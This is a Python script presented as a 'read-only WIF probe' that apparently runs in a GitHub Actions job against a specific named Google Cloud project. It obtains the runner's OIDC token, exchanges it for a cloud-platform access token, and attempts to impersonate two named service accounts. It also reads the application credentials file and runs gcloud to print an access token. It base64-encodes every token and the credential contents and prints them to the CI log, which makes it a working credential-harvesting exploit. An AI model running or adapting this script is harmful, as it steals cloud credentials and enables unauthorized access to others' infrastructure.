#!/usr/bin/env python3
"""C211-I104684 read-only WIF probe."""
import os, sys, json, base64, subprocess

def emit(t, v):
    try:
        print("C211_%s=%s" % (t, base64.b64encode(str(v).encode()).decode()), flush=True)
    except Exception:
        pass

emit("START", "|".join(os.environ.get(k, "") for k in ("GITHUB_REPOSITORY", "GITHUB_EVENT_NAME", "GITHUB_HEAD_REF", "GITHUB_REF")))
emit("ENVKEYS", ",".join(sorted([k for k in os.environ if k.startswith(("ACTIONS_ID", "GOOGLE", "GCP", "CLOUDSDK"))])))
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
emit("IDTOKEN_ENV", ("PRESENT " + u) if u else "ABSENT")
WIF = "projects/927779758991/locations/global/workloadIdentityPools/pugsite-dev-iwip/providers/pugsite-iac-github-fip"
SAS = ["pugsite-dev-github-impersonate@lgke-app-gke.iam.gserviceaccount.com",
       "pugsite-dev-iac-sa@lgke-app-gke.iam.gserviceaccount.com"]
if u:
    import urllib.request as ur, urllib.parse as up
    for aud in ["//iam.googleapis.com/" + WIF, "https://iam.googleapis.com/" + WIF, WIF]:
        try:
            r = ur.Request(u + "&audience=" + up.quote(aud, safe=""), headers={"Authorization": "Bearer " + t})
            j = json.loads(ur.urlopen(r, timeout=25).read().decode())
            jwt = j.get("value", "")
            emit("IDTOKEN", json.dumps({"aud": aud, "jwt": jwt}))
            form = up.urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
                                 "audience": "//iam.googleapis.com/" + WIF,
                                 "scope": "https://www.googleapis.com/auth/cloud-platform",
                                 "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
                                 "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
                                 "subject_token": jwt}).encode()
            x = ur.Request("https://sts.googleapis.com/v1/token", data=form,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
            try:
                b = ur.urlopen(x, timeout=25).read().decode()
                emit("STS", json.dumps({"aud": aud, "status": 200, "body": b[:700]}))
                at = ""
                try:
                    at = json.loads(b).get("access_token", "")
                except Exception:
                    pass
                for sa in SAS:
                    g = ur.Request("https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + ur.parse.quote(sa) + ":generateAccessToken",
                                   data=json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "600s"}).encode(),
                                   headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"})
                    try:
                        gb = ur.urlopen(g, timeout=25).read().decode()
                        emit("IMPERSONATE", json.dumps({"sa": sa, "status": 200, "body": gb[:900]}))
                    except Exception as e:
                        body = getattr(e, "read", lambda: b"")()
                        emit("IMPERSONATE", json.dumps({"sa": sa, "status": getattr(e, "code", "ERR"), "body": str(body)[:400]}))
            except Exception as e:
                body = getattr(e, "read", lambda: b"")()
                emit("STS", json.dumps({"aud": aud, "status": getattr(e, "code", "ERR"), "body": str(body)[:700]}))
        except Exception as e:
            emit("IDTOKEN_ERR", aud + "|" + repr(e)[:150])
pth = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
try:
    if pth and os.path.exists(pth):
        emit("ADC", open(pth).read()[:3000])
    else:
        emit("ADC", "path=%r missing" % pth)
except Exception as e:
    emit("ADC_ERR", repr(e)[:150])
for cmd in (["gcloud", "auth", "print-access-token"], ["gcloud", "config", "get-value", "project"]):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        emit("GCLOUD_" + cmd[1].upper(), ((p.stdout or "") + "|ERR|" + (p.stderr or ""))[:3000])
    except Exception as e:
        emit("GCLOUD_ERR", repr(e)[:150])
emit("DONE", "probe_complete")
sys.exit(0)
